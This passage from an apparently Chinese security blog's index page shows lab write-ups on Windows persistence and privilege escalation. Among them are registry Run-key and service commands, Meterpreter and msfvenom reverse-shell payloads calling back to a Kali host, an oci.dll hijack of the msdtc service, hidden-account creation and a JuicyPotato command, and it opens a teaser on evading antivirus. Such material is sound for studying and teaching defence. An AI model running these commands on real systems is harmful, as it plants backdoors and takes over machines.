class="line">&quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices&quot; /v</span><br><span class="line">Pentestlab /t REG_SZ /d &quot;C:\tmp\pentestlab.exe&quot;</span><br><span class="line">reg add</span><br><span class="line">&quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce&quot;</span><br><span class="line">/v Pentestlab /t REG_SZ /d &quot;C:\tmp\pentestlab.exe</span><br></pre></td></tr></table></figure>
-
-<p>ps：Run中的程序是在每次系统启动时被启动，RunServices则是会在每次登录系统时被启动。</p>
-<h2 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h2><p>kali:192.168.137.133</p>
-<p>win7(受害机)：192.168.137.140</p>
-<p>中转机:192.168.137.1</p>
-<p>将shell.exe 和 pentestlab.exe下载进受害机器。并且连接shell。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220216161202941.png" alt="image-20220216161202941"></p>
-<p>因为好输入的关系，就直接在受害机器的cmd上输入了命令</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220216163350362.png" alt="image-20220216163350362"></p>
-<p>重启受害机（以当前用户），发现会自动回连kali监听终端。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220216163543418.png" alt="image-20220216163543418"></p>
-<p>另外还有两个注册表位置，这些位置允许攻击者通过执行任意有效负载或者DLL来实现持久性，这些将在登陆期间执行，并且需要管理员级别的权限。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">reg add</span><br><span class="line">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001&quot; /v</span><br><span class="line">Pentestlab /t REG_SZ /d &quot;C:\tmp\pentestlab.exe&quot;</span><br><span class="line">reg add</span><br><span class="line">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Dep</span><br><span class="line">end&quot; /v Pentestlab /t REG_SZ /d &quot;C:\tmp\pentestlab.dll&quot;</span><br></pre></td></tr></table></figure>
-
-<p>（ps:这个最特别的差别是它可以实现dll的加载，这些将在登录期间执行。并且需要管理员级别的权限。）</p>
-<h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><p><code>metasploit</code>框架通过使用<code>Meterpreter</code>脚本和后期利用模块通过注册表支持持久性。Meterpreter脚本将以vbs脚本的形式创建一个有效负载，该脚本将被拖放到磁盘上，并将创建一个注册表项，该注册表项将在用户登录期间运行有效负载。</p>
-<h2 id="测试环境：-1"><a href="#测试环境：-1" class="headerlink" title="测试环境："></a>测试环境：</h2><p>kali:192.168.137.133</p>
-<p>win7(受害机)：192.168.137.140</p>
-<p>中转机:192.168.137.1</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220216170433099.png" alt="image-20220216170433099"></p>
-<p>仍然先连接shell。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run persistence -U -P windows/meterpreter/reverse_tcp -i 5 -p 4444 -r</span><br><span class="line">192.168.137.133    #i 反向连接的时间间隔 -p指定端口 -r 远程ip</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220216171553162.png" alt="image-20220216171553162"></p>
-<p>接下来重启受害机等待自动重连。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220216171648365.png" alt="image-20220216171648365"></p>
-<p>其实在注册表里面也是能够看到该注册项目的</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220216171740691.png" alt="image-20220216171740691"></p>
-<h1 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h1><p>windows操作系统提供了一个实用程序(schtasks.exe)，使系统管理员能够在特定的日期和时间执行程序或脚本。这种行为可作为一种持久性机制被恶意利用。通过计划任务执行持久性不需要管理员权限。但如果已经获得了管理员权限的话，则允许进一步操作，例如在用户登录期间或者在空闲状态期间来执行任务。</p>
-<p>计划任务的持久化技术既可以手动实现，也可以自动实现。有效负载可以从磁盘或者远程位置执行，它们可以具有可执行文件、Powershell脚本或小脚本的形式。这虽然可以被认为是一种旧的持久性技术，但是仍然可以在持久化场景中使用。</p>
-<p><code>Metasploit</code>的<code>web_delivery</code>模块可用于托管和生成各种格式的有效负载。</p>
-<h1 id="新服务"><a href="#新服务" class="headerlink" title="新服务"></a>新服务</h1><p>如果未正确配置Windows环境中的服务或这些服务可以用作持久性方法，则致谢服务可能导致权限提升，创建一个新的服务需要管理员级别的权限。</p>
-<h2 id="命令行实现"><a href="#命令行实现" class="headerlink" title="命令行实现"></a>命令行实现</h2><p>如果账户具有本地管理员特权，则可以从命令提示符创建服务。参数<code>binpath</code>用于执行任意有效负载，而参数”auto”用于确保恶意服务自动启动</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sc create pentestlab binpath= &quot;cmd.exe /k C:\Users\pte1\Downloads\pentestlab.exe&quot; start=&quot;auto&quot;</span><br><span class="line">obj=&quot;LocalSystem&quot;</span><br><span class="line"></span><br><span class="line">sc start pentestlab</span><br></pre></td></tr></table></figure>
-
-<h2 id="测试环境：-2"><a href="#测试环境：-2" class="headerlink" title="测试环境："></a>测试环境：</h2><p>kali:192.168.137.133</p>
-<p>win7(受害机)：192.168.137.140</p>
-<p>中转机:192.168.137.1</p>
-<p>注意cmd需要在管理员权限下使用</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220216181101607.png" alt="image-20220216181101607"></p>
-<p>为了方便就直接在受害机器上创建服务引用之前的木马。然后只需要启动服务就可以自动连接上msf回话了</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220216182331304.png" alt="image-20220216182331304"></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220216182436728.png" alt="image-20220216182436728"></p>
-<h2 id="Metasploit-1"><a href="#Metasploit-1" class="headerlink" title="Metasploit"></a>Metasploit</h2><p>Metasploit框架的后开发模块，也支持两种持久性技术。</p>
-<ol>
-<li>注册表运行键</li>
-<li>新服务</li>
-</ol>
-<p>在新建的msf会话里面通过persistence_exe来增添新的服务。 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/manage/persistence_exe</span><br><span class="line">set REXEPATH /tmp/pentestlab.exe</span><br><span class="line">set SESSION 1</span><br><span class="line">set STARTUP SERVICE</span><br><span class="line">set LOCALEXEPATH C:\\tmp</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<h2 id="测试环境：-3"><a href="#测试环境：-3" class="headerlink" title="测试环境："></a>测试环境：</h2><p>在新建的msf会话里面输入以下命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/manage/persistence_exe</span><br></pre></td></tr></table></figure>
-
-<p>设置相应参数之后run</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220216190703943.png" alt="image-20220216190703943"></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220216190713743.png" alt="image-20220216190713743"></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220216191012906.png" alt="image-20220216191012906"></p>
-<p>（ps：该方法需要在提权后的shell后才能使用，否则会创建失败）</p>
-<h1 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h1><p>内存⻢是⽆⽂件攻击的⼀种技术⼿段，那我们不得不先简单介绍⼀下⽆⽂件攻击。⽆⽂件攻击可以有效地躲避传统 安全软件的检测，它们可以在系统的内存中远程加载执⾏、驻留在注册表中或滥⽤常⽤的⽩名单⼯具，例如 PowerShell，Windows Management Instrumentation（WMI）和PsExec等。⽆⽂件攻击技术允许攻击者访问系 统，从⽽启⽤后续的恶意活动。通过操纵漏洞利⽤程序、合法⼯具、宏和脚本，攻击者可以破坏系统、提升特权或在⽹络上横向传播恶意代码。⽽且，⽆⽂件威胁在执⾏后不会留下任何痕迹，这使其难以被检测和清除。</p>
-<p>内存⻢是⽆⽂件攻击的⼀种常⽤⼿段，随着攻防演练热度越来越⾼：攻防双⽅的博弈，流量分析、EDR等专业安全 设备被蓝⽅⼴泛使⽤，传统的⽂件上传的webshll或以⽂件形式驻留的后⻔越来越容易被检测到，内存⻢使⽤越来 越多。</p>
-<p>Webshell内存⻢，是在内存中写⼊恶意后⻔和⽊⻢并执⾏，达到远程控制Web服务器的⼀类内存⻢，其瞄准了企 业的对外窗⼝：⽹站、应⽤。但传统的Webshell都是基于⽂件类型的，⿊客可以利⽤上传⼯具或⽹站漏洞植⼊⽊⻢，区别在于Webshell内存⻢是⽆⽂件⻢，利⽤中间件的进程执⾏某些恶意代码，不会有⽂件落地，给检测带来巨⼤难度。</p>
-<p>内存⻢类型 根据内存⻢注⼊的⽅式，⼤致可以将内存⻢划分为如下两类 </p>
-<h2 id="1-servlet-api型"><a href="#1-servlet-api型" class="headerlink" title="1.servlet-api型"></a>1.servlet-api型</h2><p>通过命令执⾏等⽅式动态注册⼀个新的listener、filter或者servlet，从⽽实现命令执⾏等功能。特定框架、容器的 内存⻢原理与此类似，如spring的controller内存⻢，tomcat的valve内存⻢ </p>
-<h2 id="2-字节码增强型"><a href="#2-字节码增强型" class="headerlink" title="2.字节码增强型"></a>2.字节码增强型</h2><p>通过java的instrumentation动态修改已有代码，进⽽实现命令执⾏等功能。</p>
-<h2 id="3-什么是servlet"><a href="#3-什么是servlet" class="headerlink" title="3.什么是servlet"></a>3.什么是servlet</h2><p>Servlet 是运⾏在 Web 服务器或应⽤服务器上的程序，它是作为来⾃ HTTP 客户端的请求和 HTTP 服务器上的数据 库或应⽤程序之间的中间层。它负责处理⽤户的请求，并根据请求⽣成相应的返回信息提供给⽤户。</p>
-<h2 id="4-请求的处理过程"><a href="#4-请求的处理过程" class="headerlink" title="4.请求的处理过程"></a>4.请求的处理过程</h2><p>客户端发起⼀个http请求，⽐如get类型。 </p>
-<p>Servlet容器接收到请求，根据请求信息，封装成HttpServletRequest和HttpServletResponse对象。</p>
-<p> Servlet容器调⽤HttpServlet的init()⽅法，init⽅法只在第⼀次请求的时候被调⽤。 </p>
-<p>Servlet容器调⽤service()⽅法。 </p>
-<p>service()⽅法根据请求类型，这⾥是get类型，分别调⽤doGet或者doPost⽅法，这⾥调⽤doGet⽅法。</p>
-<p> doXXX⽅法中是我们⾃⼰写的业务逻辑。 </p>
-<p>业务逻辑处理完成之后，返回给Servlet容器，然后容器将结果返回给客户端。<br>容器关闭时候，会调⽤destory⽅法。</p>
-<h2 id="5-servlet生命周期"><a href="#5-servlet生命周期" class="headerlink" title="5.servlet生命周期"></a>5.servlet生命周期</h2><ol>
-<li><p>服务器启动时(web.xml中配置load-on-startup=1，默认为0)或者第⼀次请求该servlet时，就会初始化⼀个 Servlet对象，也就是会执⾏初始化⽅法init(ServletConfig conf)。 </p>
-</li>
-<li><p>servlet对象去处理所有客户端请求，在service(ServletRequest req，ServletResponse res)⽅法中执⾏</p>
-</li>
-<li><p>服务器关闭时，销毁这个servlet对象，执⾏destroy()⽅法。</p>
-</li>
-<li><p>由JVM进⾏垃圾回收。</p>
-</li>
-</ol>
-<h1 id="劫持后门"><a href="#劫持后门" class="headerlink" title="劫持后门"></a>劫持后门</h1><h2 id="msdtc-exe简介"><a href="#msdtc-exe简介" class="headerlink" title="msdtc.exe简介"></a>msdtc.exe简介</h2><p>msdtc.exe是微软的分布式传输协调程序，该进程调用了系统的<code>Microsoft personal Web Server </code>和 <code>Microsoft SQL Server</code>。该服务用于管理多个服务器。</p>
-<p>msdtc.exe是一个并列的事务，是分布于两个以上的服务器，消息队列、文件系统或者其他事务保护资源管理器。</p>
-<p>它对应的服务是MSDTC，全称为Distributed Transaction Coordinator，是windows系统默认启动的服务。</p>
-<p>对应的进程msdtc.exem,它位于windir/system32目录下</p>
-<p>当windows操作系统启动Microsoft msdtc服务时，攻击便开始了，该服务可以协调跨越多个资源管理器(例如数据库，消息队列和文件系统)的事务。一旦msdtc服务启动，它将搜索注册表。</p>
-<p>当计算机加入域中，msdtc服务启动时，会搜索注册表表HKEY_LOCAL_MACHINE-&gt; SOFTWARE-&gt;Microsoft-&gt;MSDTC-&gt;MTxOCI</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220216192109210.png" alt="image-20220216192109210"></p>
-<p>该服务的mtxoci搜索三个dll：<code>oci.dll</code>,<code>SQLLIB80.dll</code>,<code>xa80.dll</code>。windows系统默认不包含<code>oci.dll</code>（虽然注册表看起有，但是文件下搜不到）</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220216192419597.png" alt="image-20220216192419597"></p>
-<p>所以我们可以将我们的后门dll重命名为oci.dll。并将其放置在％SystemRoot％\ system32 \中。ocidll就绪，使用远程作业命令杀死msdtc服务，之后在重启它。但是这一次，它将查找oci.dll.这时候就会利于这个服务把后门dll拉起来。</p>
-<p>生成dll木马文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=8888 -f dll &gt;</span><br><span class="line">oci.dll</span><br></pre></td></tr></table></figure>
-
-<p>将生成oci.dll上传到目标机器的 C:\Windows\System32目录下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$upload oci.dll C:\\Windows</span><br><span class="line">$shell</span><br><span class="line">C:\Windows&gt;move oci.dll c:\Windows\System32</span><br></pre></td></tr></table></figure>
-
-<p>oci.dll放入system32，重启msdtc服务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskkill /f /im msdtc.exe</span><br></pre></td></tr></table></figure>
-
-<p>重启msdtc</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start msdtc</span><br></pre></td></tr></table></figure>
-
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂念</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/02/15/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Windows提权总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/02/13/Windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">Windows提权总结</a>
-    </h1>
-  
-
-        
-        <a href="/2022/02/13/Windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" class="archive-article-date">
-  	<time datetime="2022-02-13T07:44:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-13</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Windows提权的一些总结"><a href="#Windows提权的一些总结" class="headerlink" title="Windows提权的一些总结"></a>Windows提权的一些总结</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Windows提权中常用有以下几种：</p>
-<ol>
-<li>Potato家族提权</li>
-<li>系统错误配置提权</li>
-<li>令牌窃取</li>
-<li>内核提权</li>
-<li>密码收集提权</li>
-<li>数据库提权</li>
-</ol>
-<h2 id="用户与用户组"><a href="#用户与用户组" class="headerlink" title="用户与用户组"></a>用户与用户组</h2><h3 id="权限介绍"><a href="#权限介绍" class="headerlink" title="权限介绍"></a>权限介绍</h3><p>在Windows中，权限大概分为4种，分别是User、Aministrator、System、Trustedinstaller。</p>
-<p>在四种权限中，我们经常接触的是第三种。最后一种一般用不到。</p>
-<p>User:普通用户权限，是系统中最安全的权限（分配给该组的默认权限不允许成员修改操作系统的设置或用户资料）</p>
-<p>Administrato：管理员权限。可以利用Windows的机制将自己提升为System权限，以便操作SAM文件等。</p>
-<p>System：系统权限。可以对SAM等敏感文件进行读取，往往需要将Administrator权限提升到System权限才可以对散列值进行Dump操作。</p>
-<p>TrustedInstaller：Windows中的最高权限。对系统文件，即使拥有System权限也无法进行修改。只有拥有TrustedInstaller权限的用户才可以修改系统文件。</p>
-<p>低权限级别将使渗透测试受到很多限制。在Windwos中，如果没有管理员权限，就无法进行获取散列值、安装软件、修改防火墙规则、修改注册表等操作。</p>
-<h3 id="用户相关命令"><a href="#用户相关命令" class="headerlink" title="用户相关命令"></a>用户相关命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net user //查看本机用户</span><br><span class="line">net user test //查看本机test用户的相关信息</span><br><span class="line">net user test passwd /add //增加账号为test用户，密码为passwd的账户加入本地</span><br><span class="line">net user test /del //删除本机的test用户</span><br><span class="line">net user test$ passwd /add //增加账号为test用户，密码为passwd的账户加入本地（区别是它是隐藏命令）</span><br></pre></td></tr></table></figure>
-
-<h3 id="组相关命令"><a href="#组相关命令" class="headerlink" title="组相关命令"></a>组相关命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net localgroup //查看本地的组</span><br><span class="line">net localgroup administrators test //往本地Administrator组加入test用户</span><br><span class="line">net localgroup testgroup /add //增加testgroup组到本地计算机</span><br></pre></td></tr></table></figure>
-
-<h2 id="Potato家族提权"><a href="#Potato家族提权" class="headerlink" title="Potato家族提权"></a>Potato家族提权</h2><p>Potato家族提权需要的是通过各种方法在本地（NTLM-relay）中继获取SYSTEM令牌，再通过令牌执行命令。</p>
-<p>提权条件:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.获取高权限令牌 --Token</span><br><span class="line">2.SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege 权限</span><br><span class="line">（可以通过whoami/priv查看）</span><br></pre></td></tr></table></figure>
-
-<p>以下用户拥有SeImpersonatePrivilege权限：</p>
-<ol>
-<li>本地管理员账户和本地服务账号（不包括管理员组普通账户）</li>
-<li>由SCM（服务控制管理器）启动的服务</li>
-<li>由组件对象模型（COM）基础结构启动的并配置为在特定账户下运行的COM服务器</li>
-</ol>
-<p>其主要原理是当某个用户具有<code>SeImpersonatePrivilege</code>特权的时候。可以调用 <code>CreateProcessWithTokenW</code>以某个Token的权限启动新进程。</p>
-<p>当用户具有<code>SeAssignPrimaryTokenPrivilege</code>特权的时候，可以调用<code> CreateProcessAsUserW</code>以指定用户权限启动新进程。</p>
-<p>Windows的Token有以下两种：</p>
-<p>Delegation token（授权令牌）：用于交互会话登录(例如本地用户直接登录、远程桌面登录)</p>
-<p>Impersonation token（模拟令牌）：用户非交互登录（利用net user访问共享文件夹）</p>
-<p>Windows服务使用的登陆账号:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NT AUTHORITY\System</span><br><span class="line">NT AUTHORITY\Network Serivce</span><br><span class="line">NT AUTHORITY\Local Service</span><br></pre></td></tr></table></figure>
-
-<p>常见的LocalService用户，例如IIS和sqlserver的用户</p>
-<p>这里示例Potato家族中的JuicyPotato，其原理在于：</p>
-<ol>
-<li><p>通过DCOM来让服务向攻击者监听的端口发起连接并进行NTLM认证。</p>
-</li>
-<li><p>枚举可用COM对象的方法(获取对应的CLSID)：</p>
-</li>
-</ol>
-<p><a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1">juicy-potato/GetCLSID.ps1 at master · ohpe/juicy-potato · GitHub</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat">juicy-potato/test_clsid.bat at master · ohpe/juicy-potato · GitHub</a></p>
-<p>用到得测试环境中，win7有如下服务，并且拥有CLSID。 <img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220213181040822.png" alt="image-20220213181040822"></p>
-<p>查服务id可以去这个网站上查询:<a target="_blank" rel="noopener" href="https://ohpe.it/juicy-potato/CLSID/">Windows CLSID | juicy-potato (ohpe.it)</a></p>
-<p>测试环境：</p>
-<p>攻击机：kali 192.168.137.133 </p>
-<p>受害机:  win7 192.168.137.137</p>
-<p>中转主机（用于下载中转一些文件） 192.168.32.1</p>
-<p>首先用win7连接shell（跳过以上步骤）查看配置信息，查看权限等级。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220213175813309.png" alt="image-20220213175813309"></p>
-<p>翻到juicyPotato上传得目录，使用juicy_Potato进行提权开启一个新的会话，命令如下。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -t * -p C:\Users\user\Desktop\Rev.bat -l 1337 -c</span><br><span class="line">&#123;03ca98d6-ff5d-49b8-abc6-03dd84127020&#125;</span><br></pre></td></tr></table></figure>
-
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂念</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/02/13/Windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-简单远控的实现" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/01/18/%E7%AE%80%E5%8D%95%E8%BF%9C%E6%8E%A7%E7%9A%84%E5%AE%9E%E7%8E%B0/">简单远控的实现</a>
-    </h1>
-  
-
-        
-        <a href="/2022/01/18/%E7%AE%80%E5%8D%95%E8%BF%9C%E6%8E%A7%E7%9A%84%E5%AE%9E%E7%8E%B0/" class="archive-article-date">
-  	<time datetime="2022-01-18T02:12:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-18</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="远程控制的本质"><a href="#远程控制的本质" class="headerlink" title="远程控制的本质"></a>远程控制的本质</h1><p>远程控制的本质在于以下三点</p>
-<ol>
-<li>建立socket连接，用来传输命令。</li>
-<li>使用编程语言中的执行类，用来执行命令。</li>
-<li>使用io流将执行的结果传给远程终端。</li>
-</ol>
-        
-          <a class="article-more-a" href="/2022/01/18/%E7%AE%80%E5%8D%95%E8%BF%9C%E6%8E%A7%E7%9A%84%E5%AE%9E%E7%8E%B0/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/01/18/%E7%AE%80%E5%8D%95%E8%BF%9C%E6%8E%A7%E7%9A%84%E5%AE%9E%E7%8E%B0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-初入免杀" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/01/16/%E5%88%9D%E5%85%A5%E5%85%8D%E6%9D%80/">初入免杀</a>
-    </h1>
-  
-
-        
-        <a href="/2022/01/16/%E5%88%9D%E5%85%A5%E5%85%8D%E6%9D%80/" class="archive-article-date">
-  	<time datetime="2022-01-16T14:26:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="杀毒软件的基本等级"><a href="#杀毒软件的基本等级" class="headerlink" title="杀毒软件的基本等级"></a>杀毒软件的基本等级</h1><p>首先要了解杀毒软件的定义等级如下：</p>
-<ol>
-<li>无害</li>
-<li>可疑</li>
-<li>确认为病毒</li>
-</ol>
-<p>我们需要把程序做到<code>无害</code>等级才能支撑我们的下一步动作</p>
-<h1 id="杀毒软件是如何进行识别病毒程序"><a href="#杀毒软件是如何进行识别病毒程序" class="headerlink" title="杀毒软件是如何进行识别病毒程序"></a>杀毒软件是如何进行识别病毒程序</h1><h2 id="静态识别："><a href="#静态识别：" class="headerlink" title="静态识别："></a>静态识别：</h2><p>杀软的大体查杀规则是基于文件hash值（整体hash或者片段hash等）、字符串特征、函数特征、api检测、敏感行为（如加、解密）行为检测等这些方面。对于静态检测主要的目的是在于绕过对文件哈希字符串导入API等特征来进行的。</p>
-        
-          <a class="article-more-a" href="/2022/01/16/%E5%88%9D%E5%85%A5%E5%85%8D%E6%9D%80/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/01/16/%E5%88%9D%E5%85%A5%E5%85%8D%E6%9D%80/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-ctf密码学" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
